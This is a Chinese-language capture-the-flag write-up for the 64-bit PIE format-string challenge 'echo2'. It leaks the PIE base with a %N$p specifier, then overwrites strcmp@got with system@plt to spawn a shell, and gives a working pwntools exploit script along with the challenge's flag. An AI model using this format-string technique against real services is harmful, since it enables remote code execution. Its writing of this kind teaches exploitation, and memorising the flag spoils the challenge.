# PHM #65 Pwn — echo2

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 100 |
| 連線 | `nc ctf.hackme.quest 7712` |
| 檔案 | [`/static/echo2`](https://ctf.hackme.quest/static/echo2) (ELF **64-bit PIE**, not stripped) |
| 提示 | ASLR enabled |
| 保護 | NX, **PIE**, No canary(用不到, echo() 不 return) |

## 分析

跟 [#64](echo.md) 同結構 (`printf(buf)` 迴圈 + `strcmp` 誘餌), 但 64-bit + PIE + ASLR, 所以 GOT / PLT 位址都隨機 → 要先 **leak PIE base**。

- 緩衝區在格式字串參數偏移 **6** (`ABCDEFGH`→`%6$p`)。
- 掃 stack 發現 **`%41$p` = `base + 0xa03`** (echo 返回 main 的位址)。→ `base = leak - 0xa03`。

`echo()` 只會 `system`/`exit` 收尾 (永不 `ret`), 所以 canary 沒用。拿到 base 後就跟 #64 一樣: 把 **`strcmp@got` (base+0x201038) 蓋成 `system@plt` (base+0x790)**, 再送 `/bin/sh`。全部在同一條連線內完成 (base 每次連線都不同)。

## 解法

```python
from pwn import *
context(arch='amd64', os='linux')
io=remote('ctf.hackme.quest',7712)
io.sendline(b'%41$p'); base=int(io.recvline().strip(),16)-0xa03
io.sendline(fmtstr_payload(6, {base+0x201038: base+0x790}, write_size='short'))
io.sendline(b'/bin/sh')
io.sendline(b'cat flag'); print(io.recvall(timeout=5))
```

## Flag

```
FLAG{do you know PIE? %9$s or the ASLR? %9c$8$hhn}
```

## 感想

64-bit fmt 的重點是「先用一個 `%N$p` 漏固定偏移的 PIE 位址回推 base」, 之後所有 GOT/PLT 位址都 = base + 固定 offset, 剩下跟 32-bit 版一模一樣。payload 用 `write_size='short'` 只有 64 bytes, 遠在 fgets 的 0x100 限制內。
